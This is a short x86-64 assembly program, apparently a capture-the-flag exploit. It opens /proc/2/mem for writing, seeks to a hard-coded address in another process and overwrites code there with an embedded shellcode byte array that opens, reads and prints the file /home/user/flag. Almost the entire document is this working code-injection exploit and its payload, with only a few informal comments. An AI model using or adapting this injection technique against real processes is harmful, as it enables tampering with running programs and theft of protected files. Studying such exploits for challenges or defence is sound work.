[BITS 64]

global _start

_start:
mov rsi, [rbp-0xc]
add rsp, -0x200
mov rdi, rsp
mov rcx, '/proc/2/'
mov [rdi], rcx

; this was split into two secitons
; because I thought I needed to dynamically update '/proc/$PID'
mov dl, 'm'
mov [rdi+8], dl
mov dl, 'e'
mov [rdi+9], dl
mov dl, 'm'
mov [rdi+10], dl
mov dl, 0x0
mov [rdi+11], dl

;; Okay, we have the mem string
; open mem
mov rax, 2
mov rdx, 0
mov rsi, 1 ; O_WRONLY
syscall
mov r9, rax ; store filedescriptor

; push new shellcode to stack; generate this code
; from shell See "Part 2"
;; Put shell code into r10
mov r10, DATA

;; Seek to target location
mov rax, 8 ; lseek
mov rdi, r9
mov rsi, 0x004022e3 ; replace jmp after sleep with our code
mov rdx, 0 ; SET_SEEK
syscall

;; Write Shell code
mov rax, 1
mov rdi, r9
lea rsi, [rel DATA]
mov rdx, 100; sizeof(shellcode)
syscall

;; busy wait, let the other process do stuff, don't know how to yield
;; don't know if HLT works, nor do I know 'sleep' location. Sorry sre's.
mark:
  jmp mark ;mov rsi, [rbp-0xc]

DATA:
db 72, 184, 101, 114, 47, 102, 108, 97, 103, 0, 80, 72, 184, 47, 104, 111, 109, 101, 47, 117, 115, 80, 191, 1, 0, 0, 0, 72, 137, 230, 186, 15, 0, 0, 0, 184, 1, 0, 0, 0, 15, 5, 184, 2, 0, 0, 0, 72, 137, 231, 190, 0, 0, 0, 0, 186, 0, 0, 0, 0, 15, 5, 72, 137, 199, 72, 137, 230, 186, 100, 0, 0, 0, 184, 0, 0, 0, 0, 15, 5, 191, 1, 0, 0, 0, 72, 137, 230, 186, 100, 0, 0, 0, 184, 1, 0, 0, 0, 15, 5
